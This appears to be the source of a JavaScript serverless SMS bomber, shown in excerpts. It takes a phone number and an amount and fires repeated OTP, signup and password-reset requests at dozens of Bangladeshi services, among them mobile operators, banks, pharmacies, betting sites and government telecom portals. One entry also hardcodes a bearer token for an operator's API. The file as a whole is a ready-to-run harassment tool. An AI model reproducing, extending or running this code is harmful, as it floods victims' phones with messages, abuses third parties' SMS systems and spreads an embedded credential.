...
function buildApis(phone) {
  ...
  return [
    ...
    {
      name: "PaperFly",
      fn: () => callApi("https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", {
    ...
    {
      name: "Ghoori",
      fn: () => callApi("https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", {
        method: "POST", headers: { "content-type": "application/json" },
    ...
    {
      name: "Doctime",
      fn: () => callApi("https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber", {
        method: "POST", headers: { "content-type": "application/json" },
    ...
    {
      name: "Sundarban",
      fn: () => callApi("https://api-gateway.sundarbancourierltd.com/graphql", {
        method: "POST", headers: { "content-type": "application/json" },
    ...
    {
      name: "Apex4U",
      fn: () => callApi("https://api.apex4u.com/api/auth/login", {
        method: "POST", headers: { "content-type": "application/json" },
    ...
    {
      name: "Robi",
      fn: () => callApi("https://webapi.robi.com.bd/v1/send-otp", {
    ...
    {
      name: "Banglalink",
      fn: () => callApi("https://web-api.banglalink.net/api/v1/user/number/validation/" + p0),
    },
    {
      name: "Banglalink OTP",
      fn: () => callApi("https://web-api.banglalink.net/api/v1/user/otp-login/request", {
    ...
    {
      name: "Grameenphone",
      fn: () => callApi("https://webloginda.grameenphone.com/backend/api/v1/otp", {
    ...
    {
      name: "Robi DA",
      fn: () => callApi("https://da-api.robi.com.bd/da-nll/otp/send", {
        method: "POST", headers: { "content-type": "application/json" },
    ...
    {
      name: "Robi Chat",
      fn: () => callApi("https://webapi.robi.com.bd/v1/chat/send-otp", {
        method: "POST", headers: { "content-type": "application/json", Authorization: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI" },
    ...
    {
      name: "Redx",
      fn: () => callApi("https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", {
        method: "POST", headers: { "content-type": "application/json" },
        body: JSON.stringify({ phoneNumber: p0 }),
      }),
    },
    {
      name: "Fundesh",
      fn: () => callApi("https://fundesh.com.bd/api/auth/generateOTP?service_key=", {
    ...
    {
      name: "Bikroy",
      fn: () => callApi("https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=" + p0),
    },
    {
      name: "MotionView",
      fn: () => callApi("https://api.motionview.com.bd/api/send-otp-phone-signup", {
        method: "POST", headers: { "content-type": "application/json" },
    ...
    {
      name: "Chorki",
      fn: () => callApi("https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web", {
        method: "POST", headers: { "content-type": "application/json" },
    ...
    {
      name: "Jatri",
      fn: () => callApi("https://user-api.jslglobal.co:444/v2/send-otp", {
        method: "POST", headers: { "content-type": "application/json" },
    ...
    {
      name: "ChinaOnline",
      fn: () => callApi("https://chinaonlinebd.com/api/login/getOtp?phone=" + p0),
    },
    {
      name: "Deepto",
      fn: () => callApi("https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", {
        method: "POST", headers: { "content-type": "application/json" },
    ...
    {
      name: "Shikho",
      fn: () => callApi("https://api.shikho.com/auth/v2/send/sms", {
        method: "POST", headers: { "content-type": "application/json" },
    ...
    {
      name: "Redx Signup",
      fn: () => callApi("https://api.redx.com.bd/v1/user/signup", {
        method: "POST", headers: { "content-type": "application/json" },
    ...
    {
      name: "Bioscope",
      fn: () => callApi("https://www.bioscopelive.com/en/login/send-otp?phone=88" + p0 + "&operator=bd-otp", { method: "POST" }),
    },
    {
      name: "Binge",
      fn: () => callApi("https://ss.binge.buzz/otp/send/login" + p0, { method: "POST" }),
    },
    {
      name: "AppLink",
      fn: () => callApi("https://applink.com.bd/appstore-v4-server/login/otp/request", {
        method: "POST", headers: { "content-type": "application/json" },
    ...
    {
      name: "Chokrojan",
      fn: () => callApi("https://chokrojan.com/api/v1/passenger/login/mobile", {
    ...
    {
      name: "Dhaka Bank",
      fn: () => callApi("https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber", {
        method: "POST", headers: { "content-type": "application/json" },
    ...
    {
      name: "Easy",
      fn: () => callApi("https://core.easy.com.bd/api/v1/registration", {
        method: "POST", headers: { "content-type": "application/json" },
    ...
    {
      name: "Eshop",
      fn: () => callApi("https://eshop-api.banglalink.net/api/v1/customer/send-otp", {
        method: "POST", headers: { "content-type": "application/json" },
    ...
    {
      name: "FSIBL",
      fn: () => callApi("https://freedom.fsiblbd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber", {
        method: "POST", headers: { "content-type": "application/json" },
    ...
    {
      name: "MyGP",
      fn: () => callApi("https://api.mygp.cinematic.mobi/api/v1/otp/88" + p0 + "/SBENT_3GB7D", {
        method: "POST", headers: { "content-type": "application/json" },
    ...
    {
      name: "GP Shop",
      fn: () => callApi("https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", {
        method: "POST", headers: { "content-type": "application/json" },
    ...
    {
      name: "Hishabee",
      fn: () => callApi("https://app.hishabee.business/api/V2/otp/send?mobile_number=" + p0, { method: "POST" }),
    },
    {
      name: "Iqra",
      fn: () => callApi("http://apibeta.iqra-live.com/api/v1/sent-otp/" + p0),
    },
    {
      name: "Robi Smart",
      fn: () => callApi("https://smart1216.robi.com.bd/robi_sivr/public/login/phone", {
        method: "POST", headers: { "content-type": "application/json" },
    ...
    {
      name: "MCB",
      fn: () => callApi("https://www.mcbaffiliate.com/Affiliate/RequestOTP", {
        method: "POST", headers: { "content-type": "application/x-www-form-urlencoded" },
        body: "PhoneNumber=" + p0,
      }),
    },
    {
      name: "Mithai",
      fn: () => callApi("https://mithaibd.com/api/login/", {
    ...
    {
      name: "EnglishMoja",
      fn: () => callApi("https://api.englishmojabd.com/api/v1/auth/login", {
        method: "POST", headers: { "content-type": "application/json" },
    ...
    {
      name: "MoveOn",
      fn: () => callApi("https://moveon.com.bd/api/v1/customer/auth/phone/request-otp", {
        method: "POST", headers: { "content-type": "application/json" },
        body: JSON.stringify({ phone: p0 }),
      }),
    },
    {
      name: "OshudPotro",
      fn: () => callApi("https://api.osudpotro.com/api/v1/users/send_otp", {
        method: "POST", headers: { "content-type": "application/json" },
    ...
    {
      name: "MyGP Login",
      fn: () => callApi("https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88" + p0 + "&lang=en"),
    },
    {
      name: "Qcoom",
      fn: () => callApi("https://auth.qcoom.com/api/v1/otp/send", {
        method: "POST", headers: { "content-type": "application/json" },
    ...
    {
      name: "Circle",
      fn: () => callApi("https://reseller.circle.com.bd/api/v2/auth/signup", {
        method: "POST", headers: { "content-type": "application/json" },
    ...
    {
      name: "Shomvob",
      fn: () => callApi("https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0", {
    ...
    {
      name: "ToyBox",
      fn: () => callApi("https://toybox.com.bd/api/v1/otp", {
        method: "POST", headers: { "content-type": "application/json" },
        body: JSON.stringify({ phone: p0 }),
      }),
    },
    {
      name: "Win2Gain",
      fn: () => callApi("https://win2gain.com.bd/api/v1/auth/send-otp", {
        method: "POST", headers: { "content-type": "application/json" },
        body: JSON.stringify({ phone: p0 }),
      }),
    },
    {
      name: "Kepler",
      fn: () => callApi("https://kepler.com.bd/api/auth/send-otp", {
        method: "POST", headers: { "content-type": "application/json" },
        body: JSON.stringify({ phone: p0 }),
      }),
    },
    {
      name: "Roots Edu",
      fn: () => callApi("https://rootsedulive.com/api/v1/auth/send-otp", {
        method: "POST", headers: { "content-type": "application/json" },
        body: JSON.stringify({ phone: p0 }),
      }),
    },
    {
      name: "Roots Forget",
      fn: () => callApi("https://rootsedulive.com/api/v1/auth/forget-password", {
        method: "POST", headers: { "content-type": "application/json" },
        body: JSON.stringify({ phone: p0 }),
      }),
    },
    ...
    {
      name: "BTCL MyBTCL",
      fn: () => callApi("https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json", {
    ...
    {
      name: "BTCL PhoneBill",
      fn: () => callApi("https://phonebill.btcl.com.bd/api/bcare/anonym/sendOTP.json", {
        method: "POST", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" },
        body: JSON.stringify({ phoneNbr: p0, email: "", OTPType: 1, userName: "" }),
      }),
    },
    {
      name: "BTCL BDIA",
      fn: () => callApi("https://bdia.btcl.com.bd/client/client/registrationMobVerification-2.jsp?moduleID=1", {
        method: "POST", headers: { "content-type": "application/json" },
        body: JSON.stringify({ actionType: "otpSend", mobileNo: p0 }),
      }),
    },
    {
      name: "Bioscope Plus",
      fn: () => callApi("https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en", {
        method: "POST", headers: { "content-type": "application/json" },
        body: JSON.stringify({ number: pp88 }),
      }),
    },
    {
      name: "BD Tickets",
      fn: () => callApi("https://api.bdtickets.com:20100/v1/auth", {
        method: "POST", headers: { "content-type": "application/json" },
    ...
    {
      name: "Swap",
      fn: () => callApi("https://api.swap.com.bd/api/v1/send-otp/v2", {
    ...
    {
      name: "Ilyn Global",
      fn: () => callApi("https://api.ilyn.global/auth/signup", {
        method: "POST", headers: { "content-type": "application/json", appcode: "ilyn-bd" },
        body: JSON.stringify({ phone: JSON.stringify({ code: "BD", number: pp880 }), provider: "sms" }),
      }),
    },
    {
      name: "Arogga",
      fn: () => callApi("https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome&v=141.0.0.0&os=Windows&osv=10", {
        method: "POST", headers: { "content-type": "application/x-www-form-urlencoded" },
    ...
    {
      name: "Garibook",
      fn: () => callApi("https://api.garibookadmin.com/api/v3/user/login", {
        method: "POST", headers: { "content-type": "application/json" },
    ...
    {
      name: "Sheba",
      fn: () => callApi("https://accountkit.sheba.xyz/api/shoot-otp", {
        method: "POST", headers: { "content-type": "application/json;charset=UTF-8", "custom-headers": '{"portal-name": "Customer Web"}' },
    ...
    {
      name: "AppLink2",
      fn: () => callApi("https://apps.applink.com.bd/appstore-v4-server/login/otp/request", {
        method: "POST", headers: { "content-type": "application/json" },
        body: JSON.stringify({ msisdn: p88 }),
      }),
    },
    {
      name: "MyGP Cinematic",
      fn: () => callApi(`https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/${pp88}`, {
    ...
    {
      name: "MedEasy",
      fn: () => callApi(`https://api.medeasy.health/api/send-otp/${pp88}/`, {
    ...
    {
      name: "TheClinicall",
      fn: () => callApi("https://theclinicall.com/bkapi/auth/user/otp/signin", {
    ...
    {
      name: "Shombhob",
      fn: () => callApi("https://shombhob.com/api/otp-login", {
    ...
    {
      name: "Care Box",
      fn: () => callApi("https://www.api-care-box.click/api/user/register/?version=otp", {
        method: "POST", headers: { "content-type": "application/json" },
    ...
    {
      name: "Renix Care",
      fn: () => callApi("https://renixapi.renixcare.com/sms-api/send-otp", {
        method: "POST", headers: { "content-type": "application/json" },
        body: JSON.stringify({ phone: p0 }),
      }),
    },
    {
      name: "Jayabaji",
      fn: () => callApi("https://www.jayabaji3.com/api/register/check-username", {
    ...
    {
      name: "PKLuck2 Reg",
      fn: () => callApi("https://www.pkluck2.com/wps/verification/sms/register", {
    ...
    {
      name: "PKLuck2 Login",
      fn: () => callApi("https://www.pkluck2.com/wps/verification/sms/noLogin", {
        method: "POST", headers: { "content-type": "application/json", Device: "web", Language: "BN", Merchant: "pklubdtf4" },
    ...
    {
      name: "GP Flexiplan",
      fn: () => callApi("https://gpwebms.grameenphone.com/api/v1/flexiplan-purchase/activation", {
    ...
    {
      name: "GP FWA",
      fn: () => callApi("https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp", {
        method: "POST", headers: { "content-type": "application/json" },
        body: JSON.stringify({ phone: p0, email: "", language: "en" }),
      }),
    },
    {
      name: "Mevrik",
      fn: () => callApi("https://channels.mevrik.com:4202/api/v1/claim-session", {
    ...
    },
    {
      ...
      fn: () => callApi("https://app.priyoshikkhaloy.com/api/user/register-login.php", {
        method: "POST", headers: { "content-type": "application/x-www-form-urlencoded" },
        body: "mobile=" + p0,
      }),
    },
    {
      ...
      fn: () => callApi("https://backend.sailor.clothing/api/v2/auth/password/forget_request", {
    ...
    {
      name: "ePharma",
      fn: () => callApi("https://epharma.com.bd/authentication/send-otp", {
...
export default async function handler(req) {
  ...
  if (!phone || !amount) {
    return new Response(JSON.stringify({ error: "phone and amount required" }), { status: 400, headers: { "Content-Type": "application/json" } });
  }
  ...
  return new Response(
    JSON.stringify({ results: allResults, successCount, failCount, totalApis: apis.length * cycles }),
